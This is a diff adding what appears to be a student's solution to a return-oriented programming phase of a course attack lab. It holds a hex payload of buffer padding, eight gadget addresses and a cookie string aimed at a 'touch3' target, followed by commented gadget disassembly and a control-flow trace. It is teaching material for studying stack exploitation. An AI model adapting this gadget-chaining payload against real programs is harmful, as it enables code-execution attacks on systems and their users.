@@ -1,0 +1,60 @@
+00 00 00 00 00 00 00 00     /* buffer */
+00 00 00 00 00 00 00 00     /* buffer */
+00 00 00 00 00 00 00 00     /* buffer */
+00 00 00 00 00 00 00 00     /* buffer */
+00 00 00 00 00 00 00 00     /* buffer */
+06 1a 40 00 00 00 00 00     /* gadget_1 address */
+a2 19 40 00 00 00 00 00     /* gadget_2 address */
+ab 19 40 00 00 00 00 00     /* gadget_3 address */
+48 00 00 00 00 00 00 00     /* offset from the stack address of gadget_2 to cookie string */
+dd 19 40 00 00 00 00 00     /* gadget_4 address */
+70 1a 40 00 00 00 00 00     /* gadget_5 address */
+13 1a 40 00 00 00 00 00     /* gadget_6 address */
+d6 19 40 00 00 00 00 00     /* gadget_7 address */
+a2 19 40 00 00 00 00 00     /* gadget_8 address */
+fa 18 40 00 00 00 00 00     /* touch3 address */
+35 39 62 39 39 37 66 61     /* cookie string */
+00                          /* string terminator */
+
+/*
+    <gadget_1>:
+    401a06: 48 89 e0                mov     %rsp,%rax
+    401a09:	c3                   	ret
+
+    <gadget_2>:
+    4019a2: 48 89 c7                mov     %rax,%rdi
+    4019a5: c3                   	ret
+
+    <gadget_3>:
+    4019ab: 58                      pop     %rax
+    4019ac: 90                      nop
+    4019ad: c3                   	ret
+
+    <gadget_4>:
+    4019dd: 89 c2                   mov     %eax,%edx
+    4019df: 90                      nop
+    4019e0: c3                   	ret
+
+    <gadget_5>:
+    401a70: 89 d1                   mov     %edx,%ecx
+    401a72: 91                      xchg
+    401a73: c3                   	ret
+
+    <gadget_6>:
+    401a13: 89 ce                   mov     %ecx,%esi
+    401a15: 90                      nop
+    401a16: 90                      nop
+    401a17:	c3                   	ret
+
+    <gadget_7>:
+    4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+    4019da:	c3                   	ret
+
+    <gadget_8>:
+    4019a2: 48 89 c7                mov     %rax,%rdi
+    4019a5: c3                   	ret
+
+    %rip trace:
+    <gadget_1> --> <gadget_2> --> <gadget_3> --> <gadget_4> --> <gadget_5>
+     --> <gadget_6> --> <gadget_7> --> <gadget_8> --> <touch3>
+*/
